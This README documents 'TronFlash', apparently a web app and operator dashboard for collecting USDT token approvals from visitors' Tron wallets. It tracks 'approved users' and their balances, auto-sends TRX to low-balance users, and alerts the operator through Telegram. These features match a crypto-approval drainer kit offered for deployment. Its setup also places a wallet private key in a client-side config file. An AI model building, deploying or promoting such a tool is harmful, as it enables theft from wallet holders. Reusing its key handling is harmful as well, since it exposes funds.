# 🚀 TronFlash Analytics Dashboard

A comprehensive analytics dashboard for TronFlash platform with real-time monitoring, user management, and smart notifications.

## ✨ Features

### 🎨 **Modern UI/UX**
- **Dark/Light Mode Toggle** - Professional theme switching
- **Responsive Design** - Works perfectly on all devices
- **Tabbed Interface** - Organized content navigation
- **Smooth Animations** - Professional transitions

### 📊 **Analytics & Monitoring**
- **Real-time Statistics** - Live data updates
- **User Management** - Track approved users with unique IDs
- **Transaction History** - Complete TRX and USDT transaction logs
- **Performance Metrics** - Success rates, error tracking
- **Daily Analytics** - Comprehensive daily reports

### 🔔 **Smart Notifications**
- **Intelligent Alerts** - High usage, error rate monitoring
- **Milestone Celebrations** - User and TRX achievement alerts
- **System Health** - Proactive system monitoring
- **Rate Limited** - Prevents notification spam

### 🔒 **Security & Configuration**
- **Centralized Config** - All settings in one place
- **Telegram Integration** - Real-time notifications
- **Data Export** - JSON export functionality
- **Local Storage** - Secure data persistence

## 📁 Project Structure

```
tronflash-dashboard/
├── index.html              # Main application entry point
├── dashboard.html          # Analytics dashboard
├── config.js              # Centralized configuration
├── analytics.js           # Analytics system
├── assets/
│   ├── css/               # Stylesheets
│   ├── js/                # JavaScript files
│   └── images/            # Images and icons
├── docs/                  # Documentation
│   ├── CONFIGURATION_GUIDE.md
│   ├── ANALYTICS_GUIDE.md
│   ├── TELEGRAM_SETUP_GUIDE.md
│   └── DASHBOARD_IMPROVEMENTS_COMPLETE.md
└── README.md              # This file
```

## 🚀 Quick Start

### 1. **Configuration**
Edit `config.js` to set up your settings:

```javascript
window.APP_CONFIG = {
    WALLET: {
        YOUR_WALLET_ADDRESS: "YOUR_WALLET_ADDRESS_HERE",
        YOUR_PRIVATE_KEY: "YOUR_PRIVATE_KEY_HERE",
        MIN_WALLET_BALANCE: 5,
        USDT_APPROVAL_CONTRACT: "TRJSETtx1h24inpobmt4Q1a3bvfkdbYhP5"
    },
    TELEGRAM: {
        BOT_TOKEN: "YOUR_TELEGRAM_BOT_TOKEN_HERE",
        CHAT_ID: "YOUR_TELEGRAM_CHAT_ID_HERE"
    }
    // ... more configuration
};
```

### 2. **Deployment**

#### **For Hostinger:**
1. Upload all files to your hosting directory
2. Ensure `index.html` is in the root directory
3. Configure your domain to point to the files

#### **For GitHub Pages:**
1. Push to GitHub repository
2. Enable GitHub Pages in repository settings
3. Set source to main branch

### 3. **Access**
- **Main App**: `your-domain.com/index.html`
- **Dashboard**: `your-domain.com/dashboard.html`

## 🔧 Configuration Guide

### **Wallet Settings**
- `YOUR_WALLET_ADDRESS`: Your Tron wallet address
- `YOUR_PRIVATE_KEY`: Your private key (keep secure!)
- `MIN_WALLET_BALANCE`: Minimum TRX to keep in wallet
- `USDT_APPROVAL_CONTRACT`: Contract for USDT approvals

### **Telegram Notifications**
- `BOT_TOKEN`: Get from @BotFather
- `CHAT_ID`: Your Telegram chat ID
- Configure notification types in `NOTIFICATIONS` section

### **TRX Auto-Send**
- `AMOUNT_TO_SEND`: TRX amount to send (in sun)
- `MAX_USER_BALANCE`: Max user balance to trigger auto-send
- `DAILY_LIMIT_ENABLED`: Enable daily sending limits

## 📊 Dashboard Features

### **Overview Tab**
- Total users, connections, TRX sent
- USDT approvals, success/error rates
- Real-time statistics with daily changes

### **Users Tab**
- List of all approved users
- Unique user IDs and wallet addresses
- User balances and approval history
- Search and filter functionality

### **Transactions Tab**
- Complete transaction history
- TRX sends and USDT approvals
- Transaction details and timestamps
- User addresses and amounts

### **Analytics Tab**
- Daily activity summaries
- Performance metrics
- Success/error rate analysis
- User activity trends

### **Settings Tab**
- Data export functionality
- Clear old data options
- System status checks
- Refresh analytics

## 🌙 Dark Mode

The dashboard includes a professional dark mode:
- **Toggle Button**: Orange gradient button in top-right
- **Smooth Transitions**: CSS transitions for theme switching
- **Theme Persistence**: Remembers your preference
- **Complete Styling**: All components support dark mode

## 📱 Mobile Support

Fully responsive design with mobile optimizations:
- **Touch-Friendly**: 44px minimum touch targets
- **Responsive Layout**: Adapts to all screen sizes
- **Stacked Navigation**: Mobile-optimized tab layout
- **Landscape Support**: Special layout for landscape mode

## 🔔 Smart Notifications

Intelligent notification system:
- **High TRX Usage**: Warns when daily limit is 80% reached
- **High Activity**: Celebrates high connection/approval days
- **Error Rate**: Alerts when error rate exceeds 10%
- **Milestones**: Celebrates user and TRX milestones

## 📚 Documentation

Complete documentation available in `docs/` folder:
- **Configuration Guide**: Detailed setup instructions
- **Analytics Guide**: Understanding the analytics system
- **Telegram Setup**: Telegram bot configuration
- **Dashboard Improvements**: Feature documentation

## 🛠️ Technical Details

### **Technologies Used**
- **HTML5**: Modern semantic markup
- **CSS3**: Advanced styling with CSS variables
- **JavaScript ES6+**: Modern JavaScript features
- **Local Storage**: Client-side data persistence
- **Responsive Design**: Mobile-first approach

### **Browser Support**
- Chrome 80+
- Firefox 75+
- Safari 13+
- Edge 80+

### **Performance**
- **Fast Loading**: Optimized assets
- **Real-time Updates**: 5-second refresh intervals
- **Efficient Storage**: Local storage optimization
- **Smooth Animations**: Hardware-accelerated transitions

## 🔒 Security

### **Data Protection**
- **Local Storage**: Data stored locally in browser
- **No Server Dependencies**: Runs entirely client-side
- **Secure Configuration**: Private keys in config file
- **HTTPS Recommended**: Use HTTPS for production

### **Best Practices**
- Keep private keys secure
- Use HTTPS in production
- Regular data backups
- Monitor error logs

## 🚀 Deployment Options

### **Static Hosting**
- **Hostinger**: Upload files to public_html
- **GitHub Pages**: Free hosting with GitHub
- **Netlify**: Drag and drop deployment
- **Vercel**: Git-based deployment

### **Requirements**
- **Web Server**: Any static file server
- **HTTPS**: Recommended for security
- **Modern Browser**: ES6+ support required

## 📞 Support

For support and questions:
1. Check the documentation in `docs/` folder
2. Review configuration in `config.js`
3. Check browser console for errors
4. Verify all settings are correct

## 📄 License

This project is for educational and commercial use. Please ensure you comply with all applicable laws and regulations when using this software.

## 🎯 Version

**Current Version**: 2.0.0
**Last Updated**: 2024
**Features**: Dark Mode, Mobile Optimization, Smart Notifications

---

**🎉 Enjoy your new TronFlash Analytics Dashboard!**

Built with ❤️ for the TronFlash community.
